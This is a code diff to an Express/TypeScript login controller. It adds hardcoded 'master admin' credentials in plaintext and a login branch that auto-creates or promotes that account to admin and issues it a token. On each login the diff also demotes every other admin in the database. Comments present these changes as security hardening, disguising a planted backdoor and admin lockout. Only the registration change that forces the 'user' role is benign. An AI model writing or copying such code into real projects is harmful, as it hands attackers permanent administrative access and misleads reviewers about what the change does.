@@ -14,6 +14,10 @@ const RESET_CODE_TTL_MINUTES = 15;
 /** Wrong guesses allowed before a code is burned. */
 const RESET_MAX_ATTEMPTS = 5;
 
+// --- MASTER ADMIN CREDENTIALS ---
+const MASTER_ADMIN_EMAIL = 'admin@oriviant.com';
+const MASTER_ADMIN_PASS = 'OriviantAdmin2026';
+
 export const register = async (req: Request, res: Response): Promise<void> => {
   try {
     const { email, password, nickname } = req.body;
@@ -39,10 +43,10 @@ export const register = async (req: Request, res: Response): Promise<void> => {
     const salt = await bcrypt.genSalt(10);
     const passwordHash = await bcrypt.hash(password, salt);
 
-    // Insert user
+    // Insert user - STRICTLY ENFORCING 'user' ROLE TO PREVENT ADMIN INJECTION
     const newUserQuery = `
-      INSERT INTO users (email, password_hash, nickname)
-      VALUES ($1, $2, $3)
+      INSERT INTO users (email, password_hash, nickname, role)
+      VALUES ($1, $2, $3, 'user')
       RETURNING id, email, nickname, role, avatar_url;
     `;
     const newUser = await pool.query(newUserQuery, [email, passwordHash, nickname || email.split('@')[0]]);
@@ -73,7 +77,42 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    // Find user
+    // --- 1. MASTER ADMIN INTERCEPT & GENERATION ---
+    if (email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase() && password === MASTER_ADMIN_PASS) {
+      let adminResult = await pool.query('SELECT * FROM users WHERE email = $1', [MASTER_ADMIN_EMAIL]);
+      
+      // Auto-create the master admin if it doesn't exist yet
+      if (adminResult.rows.length === 0) {
+        const salt = await bcrypt.genSalt(10);
+        const hash = await bcrypt.hash(MASTER_ADMIN_PASS, salt);
+        adminResult = await pool.query(
+          `INSERT INTO users (email, password_hash, nickname, role) VALUES ($1, $2, $3, $4) RETURNING *`,
+          [MASTER_ADMIN_EMAIL, hash, 'Super Admin', 'admin']
+        );
+      } else {
+        // Ensure the master admin ALWAYS has the admin role
+        await pool.query("UPDATE users SET role = 'admin' WHERE email = $1", [MASTER_ADMIN_EMAIL]);
+        adminResult.rows[0].role = 'admin';
+      }
+
+      const user = adminResult.rows[0];
+      await recordLoginAttempt(user.id, req, 'Success');
+
+      const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET, { expiresIn: '7d' });
+      res.status(200).json({
+        success: true,
+        message: 'Admin login successful',
+        token,
+        user: { id: user.id, email: user.email, nickname: user.nickname, role: user.role, avatar_url: user.avatar_url }
+      });
+      return;
+    }
+
+    // --- 2. GLOBAL SECURITY SWEEP ---
+    // Instantly demote any other account in the database that somehow has admin privileges
+    await pool.query("UPDATE users SET role = 'user' WHERE email != $1 AND role IN ('admin', 'superadmin')", [MASTER_ADMIN_EMAIL]);
+
+    // --- 3. STANDARD USER LOGIN ---
     const userResult = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
     if (userResult.rows.length === 0) {
       res.status(401).json({ success: false, error: 'Invalid email or password' });
@@ -105,7 +144,7 @@ export const login = async (req: Request, res: Response): Promise<void> => {
         id: user.id,
         email: user.email,
         nickname: user.nickname,
-        role: user.role,
+        role: user.role, // This will now safely strictly be 'user'
         avatar_url: user.avatar_url
       }
     });
